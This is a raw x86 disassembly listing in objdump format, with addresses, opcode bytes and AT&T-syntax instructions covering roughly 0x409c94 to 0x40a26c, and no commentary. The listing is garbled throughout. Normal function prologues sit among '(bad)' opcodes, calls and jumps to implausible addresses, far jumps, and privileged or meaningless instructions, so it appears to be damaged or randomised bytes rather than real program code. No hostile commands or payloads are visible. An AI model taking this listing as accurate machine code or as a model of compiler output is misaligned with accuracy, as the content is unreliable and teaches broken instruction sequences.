  409c94:	3f                   	aas
  409c95:	f9                   	stc
  409c96:	9b                   	fwait
  409c97:	4b                   	dec    %ebx
  409c98:	27                   	daa
  409c99:	92                   	xchg   %eax,%edx
  409c9a:	f5                   	cmc
  409c9b:	f9                   	stc
  409c9c:	4b                   	dec    %ebx
  409c9d:	91                   	xchg   %eax,%ecx
  409c9e:	fd                   	std
  409c9f:	43                   	inc    %ebx
  409ca0:	f9                   	stc
  409ca1:	41                   	inc    %ecx
  409ca2:	42                   	inc    %edx
  409ca3:	f8                   	clc
  409ca4:	37                   	aaa
  409ca5:	2f                   	das
  409ca6:	fd                   	std
  409ca7:	49                   	dec    %ecx
  409ca8:	99                   	cltd
  409ca9:	92                   	xchg   %eax,%edx
  409caa:	43                   	inc    %ebx
  409cab:	98                   	cwtl
  409cac:	37                   	aaa
  409cad:	40                   	inc    %eax
  409cae:	4b                   	dec    %ebx
  409caf:	48                   	dec    %eax
  409cb0:	49                   	dec    %ecx
  409cb1:	4a                   	dec    %edx
  409cb2:	d6                   	salc
  409cb3:	f5                   	cmc
  409cb4:	48                   	dec    %eax
  409cb5:	4a                   	dec    %edx
  409cb6:	4b                   	dec    %ebx
  409cb7:	2f                   	das
  409cb8:	9f                   	lahf
  409cb9:	9b                   	fwait
  409cba:	40                   	inc    %eax
  409cbb:	4a                   	dec    %edx
  409cbc:	2f                   	das
  409cbd:	f8                   	clc
  409cbe:	90                   	nop
  409cbf:	9b                   	fwait
  409cc0:	4b                   	dec    %ebx
  409cc1:	99                   	cltd
  409cc2:	90                   	nop
  409cc3:	42                   	inc    %edx
  409cc4:	49                   	dec    %ecx
  409cc5:	4b                   	dec    %ebx
  409cc6:	43                   	inc    %ebx
  409cc7:	d6                   	salc
  409cc8:	fd                   	std
  409cc9:	98                   	cwtl
  409cca:	2f                   	das
  409ccb:	e9 19 e1 ff ff       	jmp    0x407de9
  409cd0:	5d                   	pop    %ebp
  409cd1:	f7 88 5d f8 c6 45 f9 	testl  $0x54ff01f9,0x45c6f85d(%eax)
  409cd8:	01 ff 54 
  409cdb:	04 c0                	add    $0xc0,%al
  409cdd:	0a 00                	or     (%eax),%al
  409cdf:	d0 c0                	rol    $1,%al
  409ce1:	45                   	inc    %ebp
  409ce2:	0f c3 53 41          	movnti %edx,0x41(%ebx)
  409ce6:	40                   	inc    %eax
  409ce7:	00 e8                	add    %ch,%al
  409ce9:	3f                   	aas
  409cea:	18 b3 00 83 c4 04    	sbb    %dh,0x4c48300(%ebx)
  409cf0:	eb 06                	jmp    0x409cf8
  409cf2:	89 1d 84 06 41 af    	mov    %ebx,0xaf410684
  409cf8:	8b 75 08             	mov    0x8(%ebp),%esi
  409cfb:	f7 c7 07 00 55 00    	test   $0x550007,%edi
  409d01:	74 6f                	je     0x409d72
  409d03:	f7 46 04 00 1b 01 f6 	testl  $0xf6011b00,0x4(%esi)
  409d0a:	74 66                	je     0x409d72
  409d0c:	a1 48 06 41 00       	mov    0x410648,%eax
  409d11:	8b 56 10             	mov    0x10(%esi),%edx
  409d14:	3b c3                	cmp    %ebx,%eax
  409d16:	c7 45 4e 01 00 00 00 	movl   $0x1,0x4e(%ebp)
  409d1d:	e8 21 f0 5e d2       	call   0xd29f8d43
  409d22:	53                   	push   %ebx
  409d23:	68 8c 1f dd 00       	push   $0xdd1f8c
  409d28:	6a 01                	push   $0x1
  409d2a:	e8 11 0c b1 00       	call   0xf1a940
  409d2f:	6b c4 0c             	imul   $0xc,%esp,%eax
  409d32:	3b c3                	cmp    %ebx,%eax
  409d34:	aa                   	stos   %al,%es:(%edi)
  409d35:	48                   	dec    %eax
  409d36:	06                   	push   %es
  409d37:	41                   	inc    %ecx
  409d38:	29 fc                	sub    %edi,%esp
  409d3a:	c3                   	ret
  409d3b:	87 00                	xchg   %eax,(%eax)
  409d3d:	00 6d 8d             	add    %ch,-0x73(%ebp)
  409d40:	4d                   	dec    %ebp
  409d41:	0c 8d                	or     $0x8d,%al
  409d43:	55                   	push   %ebp
  409d44:	e0 51                	loopne 0x409d97
  409d46:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409d49:	52                   	push   %edx
  409d4a:	51                   	push   %ecx
  409d4b:	77 d0                	ja     0x409d1d
  409d4d:	3b c3                	cmp    %ebx,%eax
  409d4f:	75 21                	jne    0x409d72
  409d51:	39 55 08             	cmp    %edx,0x8(%ebp)
  409d54:	bb 08 52 e8 44       	mov    $0x44e85208,%ebx
  409d59:	56                   	push   %esi
  409d5a:	00 35 b7 4e 08 83    	add    %dh,0x83084eb7
  409d60:	c4 08                	les    (%eax),%ecx
  409d62:	0b c8                	or     %eax,%ecx
  409d64:	8b 46 d3             	mov    -0x2d(%esi),%eax
  409d67:	60                   	pusha
  409d68:	00 5a 10             	add    %bl,0x10(%edx)
  409d6b:	00 89 4e e1 89 52    	add    %cl,0x5289e14e(%ecx)
  409d71:	04 f7                	add    $0xf7,%al
  409d73:	c7 00 00 33 00 0f    	movl   $0xf003300,(%eax)
  409d79:	84 81 00 00 00 d4    	test   %al,-0x2c000000(%ecx)
  409d7f:	46                   	inc    %esi
  409d80:	04 00                	add    $0x0,%al
  409d82:	8a 02                	mov    (%edx),%al
  409d84:	00 74 17 8b          	add    %dh,-0x75(%edi,%edx,1)
  409d88:	46                   	inc    %esi
  409d89:	14 eb                	adc    $0xeb,%al
  409d8b:	08 ec                	or     %ch,%ah
  409d8d:	02 00                	add    (%eax),%al
  409d8f:	00 00                	add    %al,(%eax)
  409d91:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409d94:	a1 70 06 41 00       	mov    0x410670,%eax
  409d99:	3b c3                	cmp    %ebx,%eax
  409d9b:	75 19                	jne    0x409db6
  409d9d:	53                   	push   %ebx
  409d9e:	68 53 01 77 3e       	push   $0x3e770153
  409da3:	6a 01                	push   $0x1
  409da5:	e8 96 42 00 00       	call   0x40e040
  409daa:	83 83 0c 3b 2f a3 48 	addl   $0x48,-0x5cd0c4f4(%ebx)
  409db1:	37                   	aaa
  409db2:	41                   	inc    %ecx
  409db3:	00 fb                	add    %bh,%bl
  409db5:	1a 8d 4d c6 8d 55    	sbb    0x558dc64d(%ebp),%cl
  409dbb:	c1 51 8b 53          	rcll   $0x53,-0x75(%ecx)
  409dbf:	98                   	cwtl
  409dc0:	6d                   	insl   (%dx),%es:(%edi)
  409dc1:	51                   	push   %ecx
  409dc2:	ff d0                	call   *%eax
  409dc4:	eb 14                	jmp    0x409dda
  409dc6:	6a 01                	push   $0x1
  409dc8:	ff 15 a1 c0 7c 00    	call   *0x7cc0a1
  409dce:	eb 8d                	jmp    0x409d5d
  409dd0:	6a 01                	push   $0x1
  409dd2:	59                   	pop    %ecx
  409dd3:	15 4c c0 40 00       	adc    $0x40c04c,%eax
  409dd8:	eb 04                	jmp    0x409dde
  409dda:	3b 4d 75             	cmp    0x75(%ebp),%ecx
  409ddd:	ba 22 55 0c 6a       	mov    $0x6a0c5522,%edx
  409de2:	ff 52 ee             	call   *-0x12(%edx)
  409de5:	b7 00                	mov    $0x0,%bh
  409de7:	00 00                	add    %al,(%eax)
  409de9:	8b 4e 08             	mov    0x8(%esi),%ecx
  409dec:	83 c4 08             	add    $0x8,%esp
  409def:	0b c8                	or     %eax,%ecx
  409df1:	8b 46 04             	mov    0x4(%esi),%eax
  409df4:	0d bf 00 20 a1       	or     $0xa12000bf,%eax
  409df9:	89 4e 34             	mov    %ecx,0x34(%esi)
  409dfc:	50                   	push   %eax
  409dfd:	46                   	inc    %esi
  409dfe:	54                   	push   %esp
  409dff:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  409e02:	74 a3                	je     0x409da7
  409e04:	a1 84 06 75 00       	mov    0x750684,%eax
  409e09:	3b c3                	cmp    %ebx,%eax
  409e0b:	74 2a                	je     0x409e37
  409e0d:	ce                   	into
  409e0e:	45                   	inc    %ebp
  409e0f:	f0 ea 48 06 41 00 3b 	lock ljmp $0xc33b,$0x410648
  409e16:	c3 
  409e17:	c7 45 ec 05 00 00 00 	movl   $0x5,-0x14(%ebp)
  409e1e:	11 19                	adc    %ebx,(%ecx)
  409e20:	53                   	push   %ebx
  409e21:	68 8c 01 41 00       	push   $0x41018c
  409e26:	6a 01                	push   $0x1
  409e28:	25 13 0b 00 00       	and    $0xb13,%eax
  409e2d:	83 c4 bc             	add    $0xffffffbc,%esp
  409e30:	3b c3                	cmp    %ebx,%eax
  409e32:	c8 48 06 41          	enter  $0x648,$0x41
  409e36:	00 74 39 8d          	add    %dh,-0x73(%ecx,%edi,1)
  409e3a:	73 aa                	jae    0x409de6
  409e3c:	8d 7f e0             	lea    -0x20(%edi),%edi
  409e3f:	51                   	push   %ecx
  409e40:	19 4d cb             	sbb    %ecx,-0x35(%ebp)
  409e43:	52                   	push   %edx
  409e44:	51                   	push   %ecx
  409e45:	ff d0                	call   *%eax
  409e47:	3c c3                	cmp    $0xc3,%al
  409e49:	75 20                	jne    0x409e6b
  409e4b:	8b 55 0c             	mov    0xc(%ebp),%edx
  409e4e:	b2 fb                	mov    $0xfb,%dl
  409e50:	2b 40 00             	sub    0x0(%eax),%eax
  409e53:	00 00                	add    %al,(%eax)
  409e55:	4a                   	dec    %edx
  409e56:	4e                   	dec    %esi
  409e57:	08 83 9c bd 0b ef    	or     %al,-0x10f44264(%ebx)
  409e5d:	8b 46 04             	mov    0x4(%esi),%eax
  409e60:	0d 00 00 40 00       	or     $0x400000,%eax
  409e65:	89 4e 8a             	mov    %ecx,-0x76(%esi)
  409e68:	89 46 61             	mov    %eax,0x61(%esi)
  409e6b:	95                   	xchg   %eax,%ebp
  409e6c:	5e                   	pop    %esi
  409e6d:	5b                   	pop    %ebx
  409e6e:	8b e5                	mov    %ebp,%esp
  409e70:	a3 c3 6a bc ff       	mov    %eax,0xffbc6ac3
  409e75:	15 36 c0 db 00       	adc    $0xdbc036,%eax
  409e7a:	eb cf                	jmp    0x409e4b
  409e7c:	55                   	push   %ebp
  409e7d:	90                   	nop
  409e7e:	90                   	nop
  409e7f:	9f                   	lahf
  409e80:	a1 08 06 41 00       	mov    0x410608,%eax
  409e85:	00 c0                	add    %al,%al
  409e87:	74 11                	je     0x409e9a
  409e89:	50                   	push   %eax
  409e8a:	ff 15 83 36 03 00    	call   *0x33683
  409e90:	36 0e                	ss push %cs
  409e92:	84 7e 41             	test   %bh,0x41(%esi)
  409e95:	00 47 00             	add    %al,0x0(%edi)
  409e98:	00 51 c3             	add    %dl,-0x3d(%ecx)
  409e9b:	90                   	nop
  409e9c:	90                   	nop
  409e9d:	90                   	nop
  409e9e:	90                   	nop
  409e9f:	90                   	nop
  409ea0:	55                   	push   %ebp
  409ea1:	8b ec                	mov    %esp,%ebp
  409ea3:	8a 4d 08             	mov    0x8(%ebp),%cl
  409ea6:	33 d6                	xor    %esi,%edx
  409ea8:	f2 c1 b8 74 05 b8 01 	repnz sarl $0x0,0x1b80574(%eax)
  409eaf:	00 
  409eb0:	00 00                	add    %al,(%eax)
  409eb2:	f6 c1 02             	test   $0x2,%cl
  409eb5:	74 02                	je     0x409eb9
  409eb7:	0c 02                	or     $0x2,%al
  409eb9:	f6 c1 f2             	test   $0xf2,%cl
  409ebc:	74 02                	je     0x409ec0
  409ebe:	0c 04                	or     $0x4,%al
  409ec0:	10 4d 0c             	adc    %cl,0xc(%ebp)
  409ec3:	d3 e0                	shl    %cl,%eax
  409ec5:	5d                   	pop    %ebp
  409ec6:	c3                   	ret
  409ec7:	a2 90 90 57 90       	mov    %al,0x90579090
  409ecc:	90                   	nop
  409ecd:	90                   	nop
  409ece:	90                   	nop
  409ecf:	90                   	nop
  409ed0:	55                   	push   %ebp
  409ed1:	8b ec                	mov    %esp,%ebp
  409ed3:	14 45                	adc    $0x45,%al
  409ed5:	08 8b 48 08 f7 c1    	or     %cl,-0x3e08f7b8(%ebx)
  409edb:	00 00                	add    %al,(%eax)
  409edd:	00 38                	add    %bh,(%eax)
  409edf:	2b 05 83 c9 51 ba    	sub    0xba51c983,%eax
  409ee5:	15 31 c9 07 d1       	adc    $0xd107c931,%eax
  409eea:	d1 89 48 08 c1 e2    	rorl   $1,-0x1d3ef7b8(%ecx)
  409ef0:	04 32                	add    $0x32,%al
  409ef2:	d1 c1                	rol    $1,%ecx
  409ef4:	e2 04                	loop   0x409efa
  409ef6:	0b cf                	or     %edi,%ecx
  409ef8:	8b e9                	mov    %ecx,%ebp
  409efa:	23 81 c9 00 00 70    	and    0x700000c9(%ecx),%eax
  409f00:	00 89 5f 08 89 48    	add    %cl,0x4889085f(%ecx)
  409f06:	04 0a                	add    $0xa,%al
  409f08:	c1 8b 4d 0c f7 d0 23 	rorl   $0x23,-0x2f08f3b3(%ebx)
  409f0f:	c1 ca d8             	ror    $0xd8,%edx
  409f12:	5f                   	pop    %edi
  409f13:	c0 25 78 11 01 00 5d 	shlb   $0x5d,0x11178
  409f1a:	c3                   	ret
  409f1b:	90                   	nop
  409f1c:	90                   	nop
  409f1d:	90                   	nop
  409f1e:	90                   	nop
  409f1f:	90                   	nop
  409f20:	55                   	push   %ebp
  409f21:	f9                   	stc
  409f22:	ec                   	in     (%dx),%al
  409f23:	53                   	push   %ebx
  409f24:	8b 14 bc             	mov    (%esp,%edi,4),%edx
  409f27:	56                   	push   %esi
  409f28:	cf                   	iret
  409f29:	75 ea                	jne    0x409f15
  409f2b:	57                   	push   %edi
  409f2c:	b9 18 00 00 00       	mov    $0x18,%ecx
  409f31:	33 c0                	xor    %eax,%eax
  409f33:	8b 97 f3 ab 8b 43    	mov    0x438babf3(%edi),%edx
  409f39:	10 33                	adc    %dh,(%ebx)
  409f3b:	d2 b9 20 00 dd 00    	sarb   %cl,0xdd0020(%ecx)
  409f41:	89 55 0c             	mov    %edx,0xc(%ebp)
  409f44:	89 46 38             	mov    %eax,0x38(%esi)
  409f47:	89 6a 3c             	mov    %ebp,0x3c(%edx)
  409f4a:	ec                   	in     (%dx),%al
  409f4b:	21 19                	and    %ebx,(%ecx)
  409f4d:	00 00                	add    %al,(%eax)
  409f4f:	e0 46                	loopne 0x409f97
  409f51:	38 89 56 3a fa 4b    	cmp    %cl,0x4bfa3a56(%ecx)
  409f57:	0c 8b                	or     $0x8b,%al
  409f59:	d0 8b 46 3c 33 ff    	rorb   $1,-0xccc3ba(%ebx)
  409f5f:	0b d1                	or     %ecx,%edx
  409f61:	0b c7                	or     %edi,%eax
  409f63:	e3 56                	jecxz  0x409fbb
  409f65:	38 bf 46 3c 57 8b    	cmp    %bh,-0x74a8c3ba(%edi)
  409f6b:	d0 8b 69 38 20 0a    	rorb   $1,0xa203869(%ebx)
  409f71:	52                   	push   %edx
  409f72:	50                   	push   %eax
  409f73:	92                   	xchg   %eax,%edx
  409f74:	ea 16 00 d0 89 6d 3c 	ljmp   $0x3c6d,$0x89d00016
  409f7b:	8b 4e d7             	mov    -0x29(%esi),%ecx
  409f7e:	8b 5a 89             	mov    -0x77(%edx),%ebx
  409f81:	46                   	inc    %esi
  409f82:	38 81 0e e3 c0 79    	cmp    %al,0x79c0e30e(%ecx)
  409f88:	b7 90                	mov    $0x90,%bh
  409f8a:	d1 69 a1             	shrl   $1,-0x5f(%ecx)
  409f8d:	d6                   	salc
  409f8e:	ff 2b                	ljmp   *(%ebx)
  409f90:	56                   	push   %esi
  409f91:	5d                   	pop    %ebp
  409f92:	89 4e e2             	mov    %ecx,-0x1e(%esi)
  409f95:	8b 4b 08             	mov    0x8(%ebx),%ecx
  409f98:	89 4e 48             	mov    %ecx,0x48(%esi)
  409f9b:	8b 75 d2             	mov    -0x2e(%ebp),%esi
  409f9e:	d7                   	xlat   %ds:(%ebx)
  409f9f:	b9 20 eb 00 00       	mov    $0xeb20,%ecx
  409fa4:	89 7e 4c             	mov    %edi,0x4c(%esi)
  409fa7:	e8 c4 18 00 00       	call   0x40b870
  409fac:	89 46 48             	mov    %eax,0x48(%esi)
  409faf:	89 8e 4c 8b 53 bf    	mov    %ecx,-0x40ac74b4(%esi)
  409fb5:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  409fb8:	57                   	push   %edi
  409fb9:	c2 0b cf             	ret    $0xcf0b
  409fbc:	8b 46 48             	mov    0x48(%esi),%eax
  409fbf:	89 4e 4c             	mov    %ecx,0x4c(%esi)
  409fc2:	57                   	push   %edi
  409fc3:	8b 9c 8b 4e 48 6a 0a 	mov    0xa6a484e(%ebx,%ecx,4),%ebx
  409fca:	50                   	push   %eax
  409fcb:	32 e8                	xor    %al,%ch
  409fcd:	bf 15 00 00 ad       	mov    $0xad000015,%edi
  409fd2:	3c 48                	cmp    $0x48,%al
  409fd4:	05 00 c0 54 b7       	add    $0xb754c000,%eax
  409fd9:	89 56 4c             	mov    %edx,0x4c(%esi)
  409fdc:	89 46 48             	mov    %eax,0x48(%esi)
  409fdf:	81 d2 69 a1 06 ff    	adc    $0xff06a169,%edx
  409fe5:	b9 20 00 00 dd       	mov    $0xdd000020,%ecx
  409fea:	89 56 4c             	mov    %edx,0x4c(%esi)
  409fed:	01 ec                	add    %ebp,%esp
  409fef:	18 89 d0 11 8b c2    	sbb    %cl,-0x3d74ee30(%ecx)
  409ff5:	8b d7                	mov    %edi,%edx
  409ff7:	85 7e a4             	test   %edi,-0x5c(%esi)
  409ffa:	e8 fa 18 00 00       	call   0x40b8f9
  409fff:	89 46 40             	mov    %eax,0x40(%esi)
  40a002:	8b 4e 40             	mov    0x40(%esi),%ecx
  40a005:	89 56 44             	mov    %edx,0x44(%esi)
  40a008:	8b 43 14             	mov    0x14(%ebx),%eax
  40a00b:	17                   	pop    %ss
  40a00c:	c8 8b c2 89          	enter  $0xc28b,$0x89
  40a010:	4e                   	dec    %esi
  40a011:	f8                   	clc
  40a012:	8b 56 40             	mov    0x40(%esi),%edx
  40a015:	0b c7                	or     %edi,%eax
  40a017:	57                   	push   %edi
  40a018:	8b c8                	mov    %eax,%ecx
  40a01a:	6a 3b                	push   $0x3b
  40a01c:	ab                   	stos   %eax,%es:(%edi)
  40a01d:	52                   	push   %edx
  40a01e:	89 46 44             	mov    %eax,0x44(%esi)
  40a021:	af                   	scas   %es:(%edi),%eax
  40a022:	6a 15                	push   $0x15
  40a024:	00 00                	add    %al,(%eax)
  40a026:	28 56 44             	sub    %dl,0x44(%esi)
  40a029:	8b 4e 44             	mov    0x44(%esi),%ecx
  40a02c:	47                   	inc    %edi
  40a02d:	d0 1d 34 40 8b 2b    	rcrb   $1,0x2b8b4034
  40a033:	10 81 c2 a6 0b e9    	adc    %al,-0x16f4593e(%ecx)
  40a039:	b7 81                	mov    $0x81,%bh
  40a03b:	d1 69 1a             	shrl   $1,0x1a(%ecx)
  40a03e:	d6                   	salc
  40a03f:	ff 89 56 6c 89 4e    	decl   0x4e896c56(%ecx)
  40a045:	44                   	inc    %esp
  40a046:	e8 54 83 1c 8b       	call   0x8b5d239f
  40a04b:	7b 83                	jnp    0x409fd0
  40a04d:	20 33                	and    %dh,(%ebx)
  40a04f:	c9                   	leave
  40a050:	0b d7                	or     %edi,%edx
  40a052:	0b c8                	or     %eax,%ecx
  40a054:	8b 45 14             	mov    0x14(%ebp),%eax
  40a057:	54                   	push   %esp
  40a058:	67 2c ba             	addr16 sub $0xba,%al
  40a05b:	01 00                	add    %eax,(%eax)
  40a05d:	00 00                	add    %al,(%eax)
  40a05f:	fe 4e 28             	decb   0x28(%esi)
  40a062:	23 c2                	and    %edx,%eax
  40a064:	74 10                	je     0x40a076
  40a066:	8b 08                	mov    (%eax),%ecx
  40a068:	f6 44 04 1b 09       	testb  $0x9,0x1b(%esp,%eax,1)
  40a06d:	c7 46 0c 06 00 00 00 	movl   $0x6,0xc(%esi)
  40a074:	eb 3c                	jmp    0x40a0b2
  40a076:	8b 0b                	mov    (%ebx),%ecx
  40a078:	8f c1                	pop    %ecx
  40a07a:	10 74 bc c7          	adc    %dh,-0x39(%esp,%edi,4)
  40a07e:	46                   	inc    %esi
  40a07f:	0c 02                	or     $0x2,%al
  40a081:	00 00                	add    %al,(%eax)
  40a083:	00 eb                	add    %ch,%bl
  40a085:	2c f6                	sub    $0xf6,%al
  40a087:	ef                   	out    %eax,(%dx)
  40a088:	40                   	inc    %eax
  40a089:	74 09                	je     0x40a094
  40a08b:	c7                   	(bad)
  40a08c:	f6 0c 03 00          	testb  $0x0,(%ebx,%eax,1)
  40a090:	00 00                	add    %al,(%eax)
  40a092:	eb 1e                	jmp    0x40a0b2
  40a094:	8b f1                	mov    %ecx,%esi
  40a096:	14 85                	adc    $0x85,%al
  40a098:	c9                   	leave
  40a099:	75 14                	jne    0x40a0af
  40a09b:	8b 4b 18             	mov    0x18(%ebx),%ecx
  40a09e:	85 64 75 0d          	test   %esp,0xd(%ebp,%esi,2)
  40a0a2:	8b 4e 28             	mov    0x28(%esi),%ecx
  40a0a5:	8b 7e 2c             	mov    0x2c(%esi),%edi
  40a0a8:	0b cf                	or     %edi,%ecx
  40a0aa:	75 03                	jne    0x40a0af
  40a0ac:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a0ad:	55                   	push   %ebp
  40a0ae:	0c de                	or     $0xde,%al
  40a0b0:	56                   	push   %esi
  40a0b1:	0c 84                	or     $0x84,%al
  40a0b3:	13 8d bd c7 46 08    	adc    0x846c7bd(%ebp),%ecx
  40a0b9:	00 00                	add    %al,(%eax)
  40a0bb:	00 10                	add    %dl,(%eax)
  40a0bd:	8b cc                	mov    %esp,%ecx
  40a0bf:	10 06                	adc    %al,(%esi)
  40a0c1:	46                   	inc    %esi
  40a0c2:	04 70                	add    $0x70,%al
  40a0c4:	81 00 00 b2 c9 74    	addl   $0x74c9b200,(%eax)
  40a0ca:	04 85                	add    $0x85,%al
  40a0cc:	c0 74 07 c7 46       	shlb   $0x46,-0x39(%edi,%eax,1)
  40a0d1:	04 71                	add    $0x71,%al
  40a0d3:	81 00 00 77 45 f7    	addl   $0xf7457700,(%eax)
  40a0d9:	5f                   	pop    %edi
  40a0da:	5e                   	pop    %esi
  40a0db:	5b                   	pop    %ebx
  40a0dc:	5d                   	pop    %ebp
  40a0dd:	c4 90 90 55 49 ec    	les    -0x13b6aa70(%eax),%edx
  40a0e3:	83 ec 30             	sub    $0x30,%esp
  40a0e6:	33 57 8b             	xor    -0x75(%edi),%edx
  40a0e9:	7d ae                	jge    0x40a099
  40a0eb:	3d 47 2c 84 c0       	cmp    $0xc0842c47,%eax
  40a0f0:	74 0e                	je     0x40a100
  40a0f2:	57                   	push   %edi
  40a0f3:	e8 d8 11 00 00       	call   0x40b2d0
  40a0f8:	85 d7                	test   %edx,%edi
  40a0fa:	92                   	xchg   %eax,%edx
  40a0fb:	59                   	pop    %ecx
  40a0fc:	d5 00                	aad    $0x0
  40a0fe:	00 e9                	add    %ch,%cl
  40a100:	d9 4f 04             	(bad) 0x4(%edi)
  40a103:	8d 45 50             	lea    0x50(%ebp),%eax
  40a106:	8d 2e                	lea    (%esi),%ebp
  40a108:	ff 15 bc c0 40 00    	call   *0x40c0bc
  40a10e:	85 c0                	test   %eax,%eax
  40a110:	75 44                	jne    0x40a156
  40a112:	8b 35 98 c0 71 e2    	mov    0xe271c098,%esi
  40a118:	09 d6                	or     %edx,%esi
  40a11a:	85 cc                	test   %ecx,%esp
  40a11c:	0f 84 b1 00 00 00    	je     0x40a1d3
  40a122:	ff d6                	call   *%esi
  40a124:	78 05                	js     0x40a12b
  40a126:	80 fc 0a             	cmp    $0xa,%ah
  40a129:	00 5e 8b             	add    %bl,-0x75(%esi)
  40a12c:	e5 5d                	in     $0x5d,%eax
  40a12e:	c2 0c 00             	ret    $0xc
  40a131:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a134:	8b 75 08             	mov    0x8(%ebp),%esi
  40a137:	52                   	push   %edx
  40a138:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a13b:	6a 01                	push   $0x1
  40a13d:	50                   	push   %eax
  40a13e:	56                   	push   %esi
  40a13f:	22 dc                	and    %ah,%bl
  40a141:	fd                   	std
  40a142:	ff                   	(bad)
  40a143:	39 8b 46 13 46 fa    	cmp    %ecx,-0x5b9ecba(%ebx)
  40a149:	10 71 f8             	adc    %dh,-0x8(%ecx)
  40a14c:	01 be 28 8b 4f 04    	add    %edi,0x44f8b28(%esi)
  40a152:	51                   	push   %ecx
  40a153:	05 15 48 d8 40       	add    $0x40d84815,%eax
  40a158:	00 85 c0 74 1a 83    	add    %al,-0x7ce58b40(%ebp)
  40a15e:	f8                   	clc
  40a15f:	02 75 09             	add    0x9(%ebp),%dh
  40a162:	c7 46 0c 06 00 64 00 	movl   $0x640006,0xc(%esi)
  40a169:	9f                   	lahf
  40a16a:	94                   	xchg   %eax,%esp
  40a16b:	83 5f 03 40          	sbbl   $0x40,0x3(%edi)
  40a16f:	07                   	pop    %es
  40a170:	c7 46 0c 05 00 00 a5 	movl   $0xa5000005,0xc(%esi)
  40a177:	7d 17                	jge    0x40a190
  40a179:	33 c9                	xor    %ecx,%ecx
  40a17b:	89 16                	mov    %edx,(%esi)
  40a17d:	65 dd 20             	frstor %gs:(%eax)
  40a180:	8b 55 f6             	mov    -0xa(%ebp),%edx
  40a183:	89 46 50             	mov    %eax,0x50(%esi)
  40a186:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a189:	53                   	push   %ebx
  40a18a:	0b c8                	or     %eax,%ecx
  40a18c:	8b 46 04             	mov    0x4(%esi),%eax
  40a18f:	89 4e 18             	mov    %ecx,0x18(%esi)
  40a192:	bf 4d e8 80 cc       	mov    $0xcc80e84d,%edi
  40a197:	70 33                	jo     0x40a1cc
  40a199:	db 89 4e 20 8b 4d    	fisttpl 0x4d8b204e(%ecx)
  40a19f:	0c 89                	or     $0x89,%al
  40a1a1:	65 04 17             	gs add $0x17,%al
  40a1a4:	d3 f7                	shl    %cl,%edi
  40a1a6:	d0 89 17 32 ca f0    	rorb   $1,-0xf35cde9(%ecx)
  40a1ac:	f4                   	hlt
  40a1ad:	23 c8                	and    %eax,%ecx
  40a1af:	89 56 24             	mov    %edx,0x24(%esi)
  40a1b2:	71 d3                	jno    0x40a187
  40a1b4:	61                   	popa
  40a1b5:	ff                   	(bad)
  40a1b6:	ff                   	(bad)
  40a1b7:	fd                   	std
  40a1b8:	5b                   	pop    %ebx
  40a1b9:	74 12                	je     0x40a1cd
  40a1bb:	74 47                	je     0x40a204
  40a1bd:	04 6a                	add    $0x6a,%al
  40a1bf:	00 51 27             	add    %dl,0x27(%ecx)
  40a1c2:	56                   	push   %esi
  40a1c3:	e8 d8 f6 ff ff       	call   0x4098a0
  40a1c8:	83 c4 10             	add    $0x10,%esp
  40a1cb:	65 5e                	gs pop %esi
  40a1cd:	8b e5                	mov    %ebp,%esp
  40a1cf:	d0 35 0c 00 33 c0    	shlb   $1,0xc033000c
  40a1d5:	5f                   	pop    %edi
  40a1d6:	d2 8b 3e 5d c2 e2    	rorb   %cl,-0x1d3da2c2(%ebx)
  40a1dc:	eb 90                	jmp    0x40a16e
  40a1de:	90                   	nop
  40a1df:	90                   	nop
  40a1e0:	55                   	push   %ebp
  40a1e1:	8b ec                	mov    %esp,%ebp
  40a1e3:	56                   	push   %esi
  40a1e4:	57                   	push   %edi
  40a1e5:	8b 7d 10             	mov    0x10(%ebp),%edi
  40a1e8:	6a 58                	push   $0x58
  40a1ea:	57                   	push   %edi
  40a1eb:	e8 76 e8 ff bc       	call   0xbd408a66
  40a1f0:	a8 1e                	test   $0x1e,%al
  40a1f2:	08 8a 31 0c 89 06    	or     %cl,0x6890c31(%edx)
  40a1f8:	28 38                	sub    %bh,(%eax)
  40a1fa:	33 02                	xor    (%edx),%eax
  40a1fc:	8b cc                	mov    %esp,%ecx
  40a1fe:	00 70 c8             	add    %dh,-0x38(%eax)
  40a201:	74 d4                	je     0x40a1d7
  40a203:	8b 32                	mov    (%edx),%esi
  40a205:	6a 60                	push   $0x60
  40a207:	6a 01                	push   $0x1
  40a209:	13 00                	adc    (%eax),%eax
  40a20b:	91                   	xchg   %eax,%ecx
  40a20c:	00 8c 40 04 01 00 00 	add    %cl,0x104(%eax,%eax,2)
  40a213:	00 ff                	add    %bh,%bh
  40a215:	15 7f cb 40 00       	adc    $0x40cb7f,%eax
  40a21a:	8b 0e                	mov    (%esi),%ecx
  40a21c:	89 41 08             	mov    %eax,0x8(%ecx)
  40a21f:	eb b0                	jmp    0x40a1d1
  40a221:	83 be dc 08 41 00 14 	cmpl   $0x14,0x4108dc(%esi)
  40a228:	3f                   	aas
  40a229:	17                   	pop    %ss
  40a22a:	f3 16                	repz push %ss
  40a22c:	83 c2 0c             	add    $0xc,%edx
  40a22f:	52                   	push   %edx
  40a230:	ff d7                	call   *%edi
  40a232:	40                   	inc    %eax
  40a233:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  40a237:	06                   	push   %es
  40a238:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40a23f:	eb 16                	jmp    0x40a257
  40a241:	8b 0e                	mov    (%esi),%ecx
  40a243:	6a 00                	push   $0x0
  40a245:	df 00                	filds  (%eax)
  40a247:	40                   	inc    %eax
  40a248:	00 89 9a 04 ff 15    	add    %cl,0x15ff049a(%ecx)
  40a24e:	44                   	inc    %esp
  40a24f:	9a 40 c1 80 16 89 c7 	lcall  $0xc789,$0x1680c140
  40a256:	08 8b 36 68 20 57    	or     %cl,0x57206836(%ebx)
  40a25c:	40                   	inc    %eax
  40a25d:	00 68 80             	add    %ch,-0x80(%eax)
  40a260:	a2 40 00 56 8b       	mov    %al,0x8b560040
  40a265:	14 50                	adc    $0x50,%al
  40a267:	e8 94 b3 9b ae       	call   0xaedc5600
  40a26c:	5f                   	pop    %edi
